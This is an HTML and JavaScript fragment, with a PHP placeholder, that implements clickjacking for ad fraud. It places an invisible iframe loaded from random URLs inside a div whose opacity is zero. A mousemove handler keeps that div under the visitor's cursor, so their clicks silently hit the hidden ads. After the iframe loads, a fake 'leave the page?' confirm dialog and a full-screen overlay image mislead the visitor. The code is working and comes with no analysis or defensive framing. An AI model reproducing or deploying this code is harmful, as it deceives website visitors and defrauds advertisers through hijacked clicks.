<script src="http://code.jquery.com/jquery-1.11.0.js"></script><div id='ads' style='width: 300px; height: 250px; position: absolute; z-index: 1000000; opacity: 0;overflow: hidden;filter: alpha(opacity=0);'> </div><script>  ifrm = document.createElement('iframe');
              ifrm.setAttribute('src', '<?php echo $randUrls;?>');
              ifrm.setAttribute('id', 'iframe2');
              ifrm.setAttribute('scrolling', 'no');
              ifrm.setAttribute('sandbox', 'allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation');
              ifrm.style.width = 300+'px';
              ifrm.style.height = 250+'px';
              ifrm.style.display = 'block';
              ifrm.style.top = '-129%';
              ifrm.style.left = '-15%';
              ifrm.style.width = '139%';
              ifrm.style.height = '247%';
              ifrm.style.position = 'absolute';
              

              document.getElementById('ads').appendChild(ifrm);
           </script><script>
            jQuery('#ads').parent().mousemove(function(e) {
              jQuery('#ads').css({
                top: e.pageY - 37,
                left: e.pageX - 150
              })
            })
            </script><div id='alertpopup' style='display:none; position:fixed; margin:0; padding:0; width:100%; height:100%; left:0; right:0; top:0; bottom:0; background-color:white; text-align:center; z-index:999999;'><img style='border: 1px solid #b2b3b2; margin: 0px auto;' src='img/confirm-popup.png' /></div><script>
          $('#iframe2').load(function() {
              var r = confirm("Do you want to leave the page?");
              document.getElementById('alertpopup').style.display='block';
              $('#iframe2').unbind('load');
          });
          </script> 
